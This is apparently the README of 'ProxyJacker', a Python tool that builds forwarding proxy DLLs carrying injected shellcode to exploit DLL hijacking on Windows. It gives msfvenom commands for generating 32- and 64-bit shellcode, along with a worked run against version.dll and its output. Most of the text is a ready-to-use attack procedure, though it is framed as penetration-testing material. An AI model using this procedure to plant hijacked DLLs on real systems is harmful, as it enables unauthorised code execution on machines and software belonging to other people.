# ProxyJacker

### Details:

Tool for creating forwarding DLL for exploiting DLL hijacking vulnerability.

### Requirements:

- [ ] Mingw-64 installed.
- [ ] Python 3.
- [ ] PEfile library.
- [ ] Colorama and Termcolor libraries.

### Procedure:

1. Create shellcode with msfvenom and save it as a binary file.

   ```bash
   msfvenom -p windows/x64/exec cmd=cmd.exe -f raw -o shellcode.bin -b "\x00" # FOR 64bit
   msfvenom -p windows/exec cmd=cmd.exe -f raw -o shellcode.bin -b "\x00" # FOR 32bit
   ```

2. Run the script with appropriate arguments.

   ```bash
   kali@kali:~/proxyjacker$ python3 proxydllhijacker.py <DLL File Location> <Path to shellcode binary file> [Optional: Location for real DLL]
   
   Example:
   kali@kali:~/proxyjacker$ python3 proxydllhijacker.py version.dll shellcode.bin "C:/Program Files (x86)/Testingapp/"
   
   Output:
   Proxy DLL Creator For DLL Hijacking
            By
          Rikunj Sindhwad
            [Mr.R0b07]

   [*] GCC is installed and available.
   [*] DLL is 32bit
   [*] Definition File Created with name of export.def
   [*] Created 32bit DLL: version_proxy.dll
   kali@kali:~/proxyjacker$
   ```

### Changelogs:

1. Initial version.
2. Added custom path to redirect.
3. Added dynamic shellcode injection from binary file.
4. Added GCC check to ensure availability before compilation.

##### Upgrade Request:

For upgrade requests, connect with me on [Telegram](https://t.me/R0B077).

#### Credits:

Credits to Pentester Academy for teaching such great stuff.

